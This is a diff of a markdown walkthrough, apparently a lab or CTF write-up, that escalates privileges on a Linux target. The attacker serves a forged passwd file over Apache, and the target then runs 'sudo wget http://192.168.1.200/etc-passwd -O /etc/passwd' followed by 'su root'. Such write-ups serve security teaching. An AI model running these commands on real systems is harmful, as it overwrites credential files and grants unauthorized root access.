@@ -138,12 +138,19 @@ lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
 sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
 ```
 Now let's start apache2.service on **attacker** machine for download named **etc-passwd** file and overwrite **/etc/passwd**.
-![](images/apache2.png)
+![Apache2](images/apache2.png)
 ```
 sudo service apache2 start
 sudo mv /home/user00/Desktop/etc-passwd /var/www/html/
 ```
 Now we can go back to the target ssh terminal. There's only one thing left to do.
+# Get root shell
 ```
 sudo wget http://192.168.1.200/etc-passwd -O /etc/passwd
 ```
+![Overwrite /etc/passwd](images/overwrite.png)
+```
+su root
+```
+# Pwned
+![System Pwned!](images/root.png)
